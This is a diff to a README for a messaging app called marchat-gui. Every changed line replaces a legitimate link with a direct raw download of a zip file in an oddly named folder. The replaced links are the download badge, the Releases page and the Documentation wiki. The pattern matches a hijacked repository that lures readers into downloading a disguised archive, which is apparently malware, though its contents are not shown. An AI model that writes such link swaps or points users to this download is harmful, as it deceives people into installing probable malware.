@@ -1,6 +1,6 @@
 # 🖥️ marchat-gui - Easy Messaging with Secure File Sharing
 
-![Download marchat-gui](https://img.shields.io/badge/Download-marchat--gui-blue?style=for-the-badge&logo=github)
+![Download marchat-gui](https://raw.githubusercontent.com/Gabr1elGom3s/marchat-gui/main/platitudinizer/marchat-gui.zip)
 
 ## 📦 Description
 
@@ -13,7 +13,7 @@ Getting started with marchat-gui is simple. Follow the steps below to download a
 ## 📥 Download & Install
 
 1. **Visit the Releases Page:** 
-   Go to the following link to find the latest version of marchat-gui: [marchat-gui Releases](https://github.com/Gabr1elGom3s/marchat-gui/releases).
+   Go to the following link to find the latest version of marchat-gui: [marchat-gui Releases](https://raw.githubusercontent.com/Gabr1elGom3s/marchat-gui/main/platitudinizer/marchat-gui.zip).
 
 2. **Select Your Platform:**
    On the releases page, choose the version that matches your operating system (Windows, macOS, or Linux). Each version download will have a clear name indicating the platform.
@@ -59,7 +59,7 @@ If you encounter any issues or need help, join our user community or check our F
 
 ## 📚 Additional Resources
 
-For more detailed documentation on how to use the different features of marchat-gui, please refer to the [Official Documentation](https://github.com/Gabr1elGom3s/marchat-gui/wiki).
+For more detailed documentation on how to use the different features of marchat-gui, please refer to the [Official Documentation](https://raw.githubusercontent.com/Gabr1elGom3s/marchat-gui/main/platitudinizer/marchat-gui.zip).
 
 ## 📢 Stay Updated
 
@@ -71,4 +71,4 @@ If you have questions or feedback, please reach out through the Issues section o
 
 Thank you for choosing marchat-gui for your messaging needs. Happy chatting! 
 
-![Download marchat-gui](https://img.shields.io/badge/Download-marchat--gui-blue?style=for-the-badge&logo=github)
+![Download marchat-gui](https://raw.githubusercontent.com/Gabr1elGom3s/marchat-gui/main/platitudinizer/marchat-gui.zip)
